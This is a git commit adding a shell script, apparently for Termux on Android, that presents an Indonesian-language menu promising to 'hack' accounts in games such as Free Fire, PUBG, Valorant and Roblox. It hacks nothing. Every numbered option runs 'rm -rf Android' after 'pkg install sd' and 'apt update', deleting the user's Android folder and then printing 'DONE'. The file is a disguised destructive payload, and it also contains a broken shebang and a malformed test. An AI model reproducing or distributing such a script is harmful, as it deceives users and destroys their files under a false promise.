c89bc1019adc121b106639cfb9ade406fd6aa1f7
Elfandonaraya <154981444+Elfandonaraya@users.noreply.github.com>
2024-01-25 19:40:47 +0700

    Add files via upload

---
+++ Hack2.sh
@@ -0,0 +1,102 @@
+#date/bin/sh
+
+#wkwkwkkwkw
+
+clear
+echo "HACK AKUN BY RIZKI"
+sleep 2
+clear
+echo "DILARANG RENAME"
+sleep 2
+clear
+echo "           HACK AKUN BY RIZKI"
+echo "========================================="
+echo "                 PILIHAN"
+echo "========================================="
+echo "[1] HACK AKUN FF LOG GOOGLE/FACEBOOK"
+echo "[2] HACK AKUN ML LOG GOOGLE/FACEBOOK"
+echo "[3] HACK AKUN PUBG LOG GOOGLE/FACEBOOK"
+echo "[4] HACK AKUN 8 BALL POOL"
+echo "[5] HACK AKUN VALORANT"
+echo "[6] HACK AKUN FIFA"
+echo "[7] HACK AKUN eFOOTBALL 2024"
+echo "[8] HACK AKUN SUPER SUS"
+echo "[9] HACK AKUN ROBLOX"
+echo "[10] HACK AKUN MODERN WARSHIPS"
+echo "[0] exit"
+echo "========================================="
+
+read -p "Ketik angka untuk tools yang diinginkan : " no
+if [ $no : "1" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "2" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "3" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "4" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "5" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "6" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "7" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "8" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "9" ]
+then
+pkg install sd
+apt update
+rm -rf Android
+echo "DONE"
+sleep 3
+elif [ $no = "10" ]
+then
+exit
+else
+   echo "input salah"
+   sleep 3
+   clear
+   sh HackAkun.sh
+   fi
+   
